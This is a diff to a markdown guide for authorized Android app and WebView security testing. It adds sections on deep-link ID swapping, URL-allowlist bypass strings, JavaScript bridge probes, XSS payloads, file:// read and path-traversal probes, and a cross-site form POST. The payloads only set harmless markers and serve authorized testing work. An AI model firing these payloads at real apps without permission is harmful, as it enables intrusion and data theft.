@@ -31,9 +31,11 @@
 * **Multiple devices:** add `-s <device-serial>` after every `adb`, including forwards.
 * <pre class="language-bash" data-line-numbers><code class="lang-bash">adb version
   adb devices -l
+  adb shell getprop ro.build.version.release
   adb shell getprop ro.build.version.sdk
   adb shell dumpsys package "&#x3C;package-name>"
   </code></pre>
+* Use the listed device serial for `-s`; use the OS/API output and installed package's target SDK to select the applicable component/permission behavior below.
 * **Record:** build, OS/target SDK, user/profile, component/authority, caller.
 * **ADB = shell UID**, not an ordinary app; root is separate.
 * **Confirm app-level access:** minimally privileged companion/Drozer agent; record permissions, signer, grants.
@@ -280,6 +282,14 @@
 * **Vary one:** scheme, host/subdomain, path, query, fragment, encoding, duplicate/missing parameters, redirect; owned IDs/destinations only.
 * **States:** logged out, accounts A/B, post-logout, expired session; verify reached data/action.
 * **Login/reset:** one-time codes, state/session binding, redirects, PKCE.
+* **Concrete route mutations:** replace the scheme/host/path/field with the actual route; deliver through the launch templates above. With A logged in, use B's known record; repeat logged out. For duplicate IDs, reverse their order too.
+  * ```text
+    demo://records/view?id=REPLACE_B_RECORD_ID
+    demo://records/view?id=REPLACE_A_RECORD_ID&id=REPLACE_B_RECORD_ID
+    demo://records/view?id=
+    demo://records/view?id=REPLACE_A_RECORD_ID&redirect=https%3A%2F%2Fprobe.example%2Flink-marker
+    ```
+* **Confirm:** protected B content/action is available under A or logged out, or an unintended redirect receives a sensitive callback. A screen opening or parser accepting duplicate parameters is not itself an authorization failure. For link-to-WebView routing, use the [WebView payloads](#untrusted-navigation-and-url-allowlists).
 * **Association:** inspect `https://<authorized-host>/.well-known/assetlinks.json`.
 * **Match:** relation, `android_app`, package, SHA-256 app-signing fingerprints against the installed build.
 * **Certificates:** compare using `apksigner verify --print-certs`; upload signer may differ, re-signing can change verification.
@@ -292,12 +302,194 @@
 * **Need:** authorized ADB, `chrome://inspect/#devices`, app WebView debugging enabled.
 * **Missing WebView:** debugging may be disabled. Instrumentation-enabled debugging is not release-build exposure.
 
-1. **Inventory:** URL/origin, redirects/frames, `WebViewClient`, settings, cookies/session.
-2. **Trace:** `loadUrl`, `loadDataWithBaseURL`, `addJavascriptInterface`, message-channel registration.
-3. **Map bridge:** actual name/class, methods, origin rules, availability; do not assume `Android` or complete JS enumeration.
-4. **Invoke:** harmless observed method from controlled content; prove attacker-reachable URL/navigation/injection.
-5. **Check:** origin/frame validation, file/content access, navigation, sensitive URLs/logs/cookies, logout, native effects.
-6. **Capture:** URL/content, navigation chain, invocation, local/API effect. DevTools execution alone is not proof of remote injection.
+#### Untrusted Navigation and URL Allowlists
+
+* **Find the input:** trace the observed deep-link/Intent extra to `loadUrl` or `loadDataWithBaseURL`; record the allowed host and actual parameter name. Set the destination to a page you control, then try these host/parser variants. Replace `trusted.example` with the real allowed host and `probe.example` with your test host.
+  * ```text
+    https://probe.example/webview.html
+    https://trusted.example.probe.example/webview.html
+    https://trusted.example@probe.example/webview.html
+    https://probe.example/?next=https://trusted.example/
+    http://trusted.example/
+    ```
+* **Launch template (Linux Bash / Windows PowerShell, unchanged):** encode the entire destination as the observed query parameter value. This example route must be replaced with the app's route; a guessed route opening nothing is not a negative result.
+  * ```text
+    adb shell "am start -W -a android.intent.action.VIEW -d 'demo://web?url=https%3A%2F%2Fprobe.example%2Fwebview.html' -p com.example.app"
+    ```
+* **Redirect variant:** use an allowed-host route that actually redirects to the test page. Compare the initial URL and final `location.origin`; test navigation after the initial load too.
+* **Confirm:** the unintended origin loads inside the app's WebView, not only an external browser. Establish the additional bridge/session/file access below; arbitrary external navigation alone does not establish account takeover.
+
+#### Native Bridge from Untrusted Content
+
+* **Identify:** in JADX, map the `addJavascriptInterface` object name to its `@JavascriptInterface` methods and argument types. Use the actual method, not an assumed `Android` object. For `WebMessageListener`/ports, use the app's registered channel and message schema instead.
+* **Host this page at the controlled URL above:** replace the bridge/method and string argument with a known read-only or marker operation. Methods with other argument counts/types require that actual signature.
+  * ```html
+    <!doctype html>
+    <meta charset="utf-8">
+    <pre id="result"></pre>
+    <script>
+    const result = document.getElementById('result');
+    try {
+      const value = window['REPLACE_BRIDGE']['REPLACE_METHOD']('webview-probe');
+      result.textContent = location.origin + '\n' + String(value);
+    } catch (error) { result.textContent = String(error); }
+    </script>
+    ```
+* **Frame variant:** embed the test page as `<iframe src="https://probe.example/webview.html"></iframe>` in a page reachable through the app. A JavaScript interface is exposed to frames too; verify the method runs from the frame, not just the top-level page.
+* **Confirm:** untrusted content invokes an unintended sensitive native operation, receives a protected value, or crosses account boundaries. A bridge that only performs its intended public action is not automatically vulnerable. DevTools invocation alone proves method behavior, not attacker reachability.
+
+#### Script Injection into a Trusted Page
+
+* **HTML sink:** supply the marker below through the actual rendered search/name/message parameter. **JavaScript string sink:** use the second payload only where the value is interpolated into a single-quoted JavaScript string; adapt the delimiter to the observed code.
+  * ```html
+    <img src=x onerror="document.documentElement.dataset.webviewProbe=location.origin">
+    ```
+  * ```text
+    ';document.documentElement.dataset.webviewProbe=location.origin;//
+    ```
+* **Check the page after the app processes the input:**
+  * ```javascript
+    document.documentElement.dataset.webviewProbe;
+    ```
+* **Confirm:** the marker contains the trusted page's origin after externally supplied input executes. Merely loading your own page and running its own script is not trusted-origin XSS.
+
+#### File Access, Mixed Content, and Session Isolation
+
+* **Local-page file-read probe:** from an attacker-reachable `file://` page, run the following against a known marker file in the app's readable storage; use the resolved path, not another app's sandbox. A hosted HTTPS page and a local file page exercise different access settings.
+  * ```javascript
+    const request = new XMLHttpRequest();
+    request.onload = () => { document.body.textContent = request.responseText; };
+    request.onerror = () => { document.body.textContent = 'read blocked'; };
+    request.open('GET', 'file:///data/user/0/com.example.app/files/webview-marker.txt');
+    request.send();
+    ```
+* **Confirm file exposure:** the controlled page displays the known marker from outside its intended read boundary. A permissive setting, failed fetch, or file loaded directly by the app does not demonstrate cross-file access.
+* **Mixed content:** add `<script src="http://probe.example/webview-marker.js"></script>` to a reachable HTTPS page; serve `document.documentElement.dataset.mixedProbe='loaded';` from that HTTP URL. Confirm execution and whether the resource's content can be influenced in the tested network model.
+* **Session test:** log in as A, open a protected WebView route, log out, then revisit that route and repeat its protected request. Log in as B and revisit A's known record. Separate stale rendered content from a new response authorized with retained A credentials.
+* **Debugging:** inspect the unmodified release build first. Debugging enabled only by your hook is an analysis aid, not proof the release exposes remote inspection.
+
+#### Cookie Scope and Flags
+
+* An authentication cookie is exposed to unintended hosts/paths, readable by page JavaScript when it should be HttpOnly, sent over HTTP, or usable in an unintended cross-site action.
+* In the inspected WebView, record the real authentication cookie's `Set-Cookie` attributes and stored Domain/Path/Secure/HttpOnly/SameSite values from the Network and Application panels. `document.cookie` and native `CookieManager.getCookie()` are not complete attribute inventories.
+* **WebView console:** replace the actual session-cookie name; compare with the cookie seen on the protected request. An HttpOnly cookie can authenticate that request while remaining absent from this JavaScript view.
+  * ```javascript
+    ({ origin: location.origin,
+       sessionCookieVisible: document.cookie.split(';').some(value =>
+         value.trim().startsWith('REPLACE_SESSION_COOKIE=')) });
+    ```
+
+| Attribute | Test | Confirm |
+| --- | --- | --- |
+| Domain | Open a controlled sibling host beneath the configured parent domain; inspect its received Cookie header | A sensitive cookie reaches a sibling origin outside the intended trust boundary. Host-only cookies should not be sent there. |
+| Path | Request an actual sibling route outside the intended cookie path; inspect the outgoing Cookie header | Cookie is sent outside its configured/intended scope. Path is routing scope, not isolation from hostile JavaScript elsewhere on the same origin. |
+| Secure | Open the matching `http://` host/path, if HTTP is reachable, and inspect the request | Authentication cookie is transmitted over cleartext; a missing flag alone does not establish a reachable transmission. |
+| HttpOnly | Run the console probe in the cookie's matching host/path | Actual authentication cookie is JavaScript-readable where the policy requires HttpOnly; native privileged cookie access does not prove a page-JavaScript bypass. |
+| SameSite | Submit a cross-site POST from a controlled different-site page to the real reversible test action | Cookie is attached and the action succeeds without the intended CSRF check. Different origins can still be same-site; top-level GET with Lax cookies can be expected. |
+
+* **Cross-site POST PoC:** replace the endpoint and form fields with the actual test action; serve from a different site, not just another port/subdomain. Check both request Cookie and the committed test-state change; `SameSite=None; Secure` may be intentional when independent CSRF protection exists.
+  * ```html
+    <form method="post" action="https://trusted.example/REPLACE_TEST_ACTION">
+      <input name="REPLACE_FIELD" value="cookie-probe">
+      <button type="submit">Submit test action</button>
+    </form>
+    ```
+
+#### WebView Profile and Account Boundaries
+
+* WebViews intended to have separate identities reuse another account's cookies, DOM storage or authenticated state. Shared storage between ordinary WebViews in one app profile is not automatically a flaw, and it is not global sharing across unrelated apps.
+* In A's WebView at the target origin, set profile markers; then open that same origin in the supposedly isolated browser/profile/account-B surface and inspect them using the second command. Also repeat a protected request for A's known object.
+  * ```javascript
+    localStorage.setItem('webview-profile-probe', 'account-A');
+    document.cookie = 'webview_profile_probe=account-A; Path=/; Secure; SameSite=Lax';
+    ```
+  * ```javascript
+    ({ origin: location.origin, localMarker: localStorage.getItem('webview-profile-probe'),
+       cookieMarker: document.cookie.includes('webview_profile_probe=account-A') });
+    ```
+* **Check the implementation:** map process/profile ownership, `WebView.setDataDirectorySuffix` where used (API 28+, process-wide and set before WebView initialization), and cookie/DOM-storage lifecycle. It is not a per-WebView account-switch API. Repeat the app's normal restart/logout transition without changing its storage configuration through a hook.
+* **Confirm:** a surface intended to be isolated can use A's actual credentials or read A's private data. Marker crossover identifies a shared store; it does not alone establish unauthorized access. Existing logout/API checks remain in [File Access, Mixed Content, and Session Isolation](#file-access-mixed-content-and-session-isolation).
+
+#### Third-Party Script in a Trusted Page
+
+* An attacker-controlled external JavaScript dependency executes with the trusted page's origin and can use its readable data/native bridge. A classic `<script src>` executes in the including document's context, not in an isolated frame belonging to the script host.
+* Serve this as the actual external dependency through a demonstrated controllable asset or owner-provided fixture; keep the top-level trusted page URL unchanged. It sets only a marker. Then use the existing [bridge test](#native-bridge-from-untrusted-content) for the observed native operation from this script context.
+  * ```javascript
+    document.documentElement.dataset.thirdPartyProbe = JSON.stringify({
+      page: location.href, executionOrigin: location.origin,
+      readableSessionCookie: document.cookie.split(';').some(value =>
+        value.trim().startsWith('REPLACE_SESSION_COOKIE='))
+    });
+    ```
+* **Confirm:** changing the real dependency causes script execution in the trusted origin and an unintended protected read/native effect. A normal included script or one injected only through DevTools proves the execution model, not an attacker-controlled dependency. HttpOnly cookies remain unreadable but may still authenticate requests initiated by that script.
+
+#### Resource Interception and Cache Boundaries
+
+* **Map the actual rule:** locate `shouldInterceptRequest`/`WebResourceResponse`, its accepted host/path, and the file/cache key it selects. For a route mapping `/assets/<name>` to local files, test these path suffixes; substitute a real marker outside the intended asset root but readable by the app.
+  * ```text
+    /assets/../files/webview-marker.txt
+    /assets/%2e%2e%2ffiles%2fwebview-marker.txt
+    /assets/..%252ffiles%252fwebview-marker.txt
+    /assets/webview-marker.txt?path=../files/webview-marker.txt
+    ```
+* **Read probe in the actual page context:** replace the URL with the mapped route. Inspect the final response and marker; if CORS prevents JavaScript reading, also distinguish that browser restriction from what the native interceptor actually returned.
+  * ```javascript
+    fetch('https://trusted.example/assets/REPLACE_CANDIDATE_PATH', { cache: 'no-store' })
+      .then(response => response.text())
+      .then(text => { document.body.textContent = 'marker=' + text.includes('webview-probe'); })
+      .catch(error => { document.body.textContent = String(error); });
+    ```
+* **Cache test:** load a private A response containing `cache-probe-A`; switch to B, reopen the same app route and compare online, offline and process-restart behavior. Change the observed query/account selector independently. Use the existing [network transition commands](business-logic-and-backend.md#request-signing-and-replay).
+* **Confirm:** the mapped URL discloses an unintended file, or B receives A's private response due to a shared/misnormalized cache key. For poisoning, inject a marker through the actual attacker-controlled content source, then show that a later trusted load reuses it; rewriting traffic with your own proxy alone does not establish attacker control.
+
+#### Geolocation, Camera, and Microphone Grants
+
+* **Host on the controlled HTTPS origin:** load it through the real navigation entry point; tap each button. Compare the trusted origin, an untrusted top-level origin and an iframe delegated with `allow="geolocation; camera; microphone"`. Test app OS permissions granted and denied separately.
+  * ```html
+    <!doctype html>
+    <meta charset="utf-8">
+    <button onclick="locate()">Location</button>
+    <button onclick="capture({video:true})">Camera</button>
+    <button onclick="capture({audio:true})">Microphone</button>
+    <pre id="result"></pre>
+    <script>
+    const show = value => { document.getElementById('result').textContent = String(value); };
+    function locate() {
+      navigator.geolocation.getCurrentPosition(
+        value => show('location granted; accuracy=' + value.coords.accuracy),
+        error => show(error.message));
+    }
+    async function capture(constraints) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        show('granted: ' + stream.getTracks().map(track => track.kind).join(','));
+        stream.getTracks().forEach(track => track.stop());
+      } catch (error) { show(error); }
+    }
+    </script>
+    ```
+* **Confirm:** an unintended origin/frame receives the actual location/stream because native `onPermissionRequest` or geolocation callbacks grant it without the required origin-level decision. OS permission alone is not per-origin consent; a rejected promise/unsupported API does not prove the native callback validates origins.
+
+#### File Chooser Destination and Grants
+
+* **Hosted-page probe:** use a known `file-chooser-probe` marker file. Compare ordinary selection, Cancel, a page navigation while the chooser is open, and the app's capture/provider variant.
+  * ```html
+    <!doctype html>
+    <meta charset="utf-8">
+    <input id="pick" type="file">
+    <pre id="result"></pre>
+    <script>
+    document.getElementById('pick').addEventListener('change', async event => {
+      const file = event.target.files[0];
+      if (!file) return;
+      const text = await file.text();
+      document.getElementById('result').textContent = location.origin +
+        '; name=' + file.name + '; marker=' + text.includes('file-chooser-probe');
+    });
+    </script>
+    ```
+* For a custom result/provider flow, use the [companion file provider](advanced-ipc-and-providers.md#dirty-stream-untrusted-provider-metadata) with its normal filename and marker changed to `file-chooser-probe`; return only the observed MIME/URI contract. Trace `onShowFileChooser` result routing and URI grants.
+* **Confirm:** a page receives a file not selected/authorized for it, or a stale chooser callback delivers the marker to the wrong origin after navigation. A page reading the file deliberately selected for that page is expected.
 
 * Static candidates: [WebView, IPC, and Dependency Checks](../static-testing/webview-ipc-and-dependencies.md).
 * References: [App Link verification](https://developer.android.com/training/app-links/verify-android-applinks), [WebView debugging](https://developer.chrome.com/docs/devtools/remote-debugging/webviews/).
